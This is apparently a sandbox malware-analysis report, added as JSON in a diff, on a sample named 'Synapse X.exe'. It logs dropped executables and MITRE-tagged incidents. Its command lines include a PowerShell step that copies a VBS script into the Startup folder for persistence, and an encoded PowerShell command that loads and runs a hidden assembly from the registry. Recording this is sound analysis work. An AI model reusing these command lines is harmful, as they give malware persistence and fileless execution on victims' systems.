@@ -1,0 +1,155 @@
+{
+ "Name": "Synapse X.exe",
+ "Md5": "7557298b3b0ad25c9f540d7e9c85a1c9",
+ "UUID": "606e09d2-04d3-4608-a419-cc6151410d4d",
+ "Processes": [
+  {
+   "OID": "5ec9f810c813eb1e9f901f37",
+   "ProcessID": 2316,
+   "ParentPID": 372,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\Synapse X.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\Synapse X.exe",
+   "ProcessType": "Main process",
+   "CreationTimestamp": 1590294544357
+  },
+  {
+   "OID": "5ec9f812c813eb1e9f902b81",
+   "ProcessID": 3896,
+   "ParentPID": 2316,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\x.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\x.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1590294545450
+  },
+  {
+   "OID": "5ec9f812c813eb1e9f902b82",
+   "ProcessID": 1916,
+   "ParentPID": 2316,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\y.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\y.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1590294545513
+  },
+  {
+   "OID": "5ec9f812c813eb1e9f902b83",
+   "ProcessID": 1444,
+   "ParentPID": 2316,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\z.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\z.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1590294545560
+  },
+  {
+   "OID": "5ec9f812c813eb1e9f902b84",
+   "ProcessID": 3288,
+   "ParentPID": 2316,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\w.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\w.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1590294545591
+  },
+  {
+   "OID": "5ec9f812c813eb1e9f902b85",
+   "ProcessID": 3920,
+   "ParentPID": 2316,
+   "CommandLine": "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\admin\\AppData\\Local\\Temp\\nj.vbs\" ",
+   "Image": "C:\\Windows\\System32\\WScript.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1590294545700
+  },
+  {
+   "OID": "5ec9f839c813eb1e9f904167",
+   "ProcessID": 3500,
+   "ParentPID": 3920,
+   "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -window 1 Copy-Item 'C:\\Users\\admin\\AppData\\Local\\Temp\\nj.vbs' 'C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\CreateExplorerShellUnelevatedTask.vbs';",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1590294584747
+  },
+  {
+   "OID": "5ec9f839c813eb1e9f904169",
+   "ProcessID": 2240,
+   "ParentPID": 3920,
+   "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noexit -exec bypass -window 1 -enc IAAkAHQAZQB4AHQAIAA9ACAAKAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIABIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABDAHIAZQBhAHQAZQBFAHgAcABsAG8AcgBlAHIAUwBoAGUAbABsAFUAbgBlAGwAZQB2AGEAdABlAGQAVABhAHMAawBcACkALgBDAHIAZQBhAHQAZQBFAHgAcABsAG8AcgBlAHIAUwBoAGUAbABsAFUAbgBlAGwAZQB2AGEAdABlAGQAVABhAHMAawApADsAIAAkAHQAZQB4AHQAIAA9ACAALQBqAG8AaQBuACAAJAB0AGUAeAB0AFsALQAxAC4ALgAtACQAdABlAHgAdAAuAEwAZQBuAGcAdABoAF0AOwAgAFsAQQBwAHAARABvAG0AYQBpAG4AXQA6ADoAQwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgAuAEwAbwBhAGQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAdABlAHgAdAApACkALgBFAG4AdAByAHkAUABvAGkAbgB0AC4ASQBuAHYAbwBrAGUAKAAkAE4AdQBsAGwALAAkAE4AdQBsAGwAKQA7AA==",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1590294584778
+  }
+ ],
+ "Incidents": [
+  {
+   "ProcessOID": "5ec9f839c813eb1e9f904167",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1060"
+   ]
+  },
+  {
+   "ProcessOID": "5ec9f839c813eb1e9f904169",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ec9f839c813eb1e9f904167",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ec9f812c813eb1e9f902b85",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1086",
+    "T1064"
+   ]
+  },
+  {
+   "ProcessOID": "5ec9f812c813eb1e9f902b82",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ec9f812c813eb1e9f902b82",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ec9f812c813eb1e9f902b84",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ec9f812c813eb1e9f902b82",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ec9f812c813eb1e9f902b83",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ec9f812c813eb1e9f902b84",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1081"
+   ]
+  },
+  {
+   "ProcessOID": "5ec9f810c813eb1e9f901f37",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1064"
+   ]
+  },
+  {
+   "ProcessOID": "5ec9f812c813eb1e9f902b81",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ec9f810c813eb1e9f901f37",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  }
+ ]
+}
